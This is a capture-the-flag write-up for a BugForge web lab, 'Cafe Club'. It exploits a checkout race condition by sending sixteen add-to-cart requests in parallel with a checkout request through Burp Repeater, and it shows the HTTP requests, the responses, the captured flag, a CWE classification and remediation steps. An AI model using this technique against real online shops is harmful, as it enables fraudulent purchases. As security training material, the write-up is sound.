# Cafe Club – cafeclub-005 – Can you checkout with more items than you initially added to your basket?

## Challenge Overview

- **Challenge:** Cafe Club
- **Platform:** BugForge
- **Category:** Web Exploitation
- **Vulnerability:** Race Condition / Business Logic Flaw
- **Difficulty:** Based on the challenge environment
- **Objective:** Checkout with more items than initially added to the basket.

### Hint

> Can you checkout with more items than you initially added to your basket?

---

## 1. Application Setup

Registered a test account and logged in to the Cafe Club web application.

Added a single product to the shopping cart through the application interface.

### Initial Cart Request

```http
POST /api/cart HTTP/2
Host: lab-1794750809359-e9qqzy.labs-app.bugforge.io
Content-Type: application/json

{"product_id":14,"quantity":1}
```

### Response

```json
{
  "message": "Item added to cart successfully"
}
```

Initially, only one product was added to the cart.

---

## 2. Normal Checkout

Proceeded to checkout and placed an order normally.

### Checkout Request

```http
POST /api/checkout HTTP/2
Host: lab-1794750809359-e9qqzy.labs-app.bugforge.io
Content-Type: application/json

{
  "points_to_use": 0,
  "use_gift_card": false,
  "card_number": "4444 4444 4444 4444",
  "card_expiry": "12/25",
  "card_cvc": "123"
}
```

### Response

```json
{
  "message": "Order placed successfully",
  "order_id": 1,
  "total": 8.99,
  "gift_card_used": 0,
  "points_used": 0,
  "points_earned": 8,
  "new_points_balance": 8
}
```

The normal checkout completed successfully with one product.

---

## 3. Exploitation Using Burp Suite

### Step 1: Capture Requests

Captured the following requests using the browser's Developer Tools Network tab and Burp Suite:

- `POST /api/cart`
- `POST /api/checkout`

Sent both requests to Burp Repeater.

### Step 2: Create Cart Requests

Duplicated the `POST /api/cart` request 15 times, resulting in 16 cart requests.

Modified the product IDs so that each request contained a unique product ID from `1` to `16`.

Example:

```json
{"product_id":1,"quantity":1}
```

```json
{"product_id":2,"quantity":1}
```

```json
{"product_id":3,"quantity":1}
```

Continued this process for all 16 products.

### Step 3: Create a Repeater Group

Added all 16 cart requests and the checkout request to a single Burp Repeater group.

The group contained:

- 16 `POST /api/cart` requests
- 1 `POST /api/checkout` request

### Step 4: Execute Requests in Parallel

Selected the Repeater group and configured:

**Send group → Send in parallel**

Executed all 17 requests simultaneously.

This introduced a race condition between cart modification and checkout processing.

### Step 5: Obtain the Flag

The checkout request returned the following response:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
```

```json
{
  "message": "Order placed successfully",
  "order_id": 2,
  "total": 482.91,
  "gift_card_used": 0,
  "points_used": 0,
  "points_earned": 482,
  "new_points_balance": 622,
  "promotional_code": "bug{5UyjAhVRCbTIjCUAJMauBPj93U8Ys7UH}"
}
```

### Flag

```text
bug{5UyjAhVRCbTIjCUAJMauBPj93U8Ys7UH}
```

---

## 4. Order Verification

Verified the order using:

```http
GET /api/orders/2
```

The response showed 16 products in the order:

| Product ID | Product Name          | Quantity |
| ---------- | --------------------- | -------- |
| 1          | Ethiopian Yirgacheffe | 1        |
| 2          | Colombian Supremo     | 1        |
| 3          | Guatemala Antigua     | 1        |
| 4          | Brazilian Santos      | 1        |
| 5          | Kenya AA              | 1        |
| 6          | House Blend           | 1        |
| 7          | French Press          | 1        |
| 8          | Pour Over Dripper     | 1        |
| 9          | Espresso Machine      | 1        |
| 10         | Coffee Grinder        | 1        |
| 11         | Milk Frother          | 1        |
| 12         | Coffee Mug Set        | 1        |
| 13         | Travel Tumbler        | 1        |
| 14         | Coffee Filters        | 1        |
| 15         | Coffee Scale          | 1        |
| 16         | Cleaning Kit          | 1        |

The order was successfully created with all 16 products.

---

## 5. Vulnerability Analysis

### Race Condition

A race condition occurs when multiple operations access or modify shared state concurrently, and the final result depends on their execution order.

In this challenge, cart modifications and checkout processing were executed concurrently.

The application failed to maintain consistent cart and checkout behavior under concurrent requests.

### Impact

- Checkout with more products than initially added.
- Unauthorized manipulation of order contents.
- Inconsistent checkout and order totals.
- Potential financial loss to the application.

### Vulnerability Classification

- CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization
- CWE-367: Time-of-Check Time-of-Use (TOCTOU) Race Condition
- Business Logic Vulnerability

---

## 6. Remediation

The application should:

1. Perform cart validation and checkout atomically within a database transaction.
2. Lock the cart during checkout to prevent concurrent modifications.
3. Validate product quantities and prices on the server.
4. Calculate order totals exclusively using trusted server-side product prices.
5. Prevent concurrent cart modifications while an order is being processed.
6. Ensure checkout uses a consistent cart snapshot.
7. Apply appropriate transaction isolation and synchronization mechanisms.

---

## Conclusion

Successfully exploited a race condition in the Cafe Club application using Burp Suite Repeater's parallel request execution.

By sending 16 cart requests concurrently with a checkout request, it was possible to purchase all 16 products despite initially adding only one product to the basket.

**Challenge Status: Solved**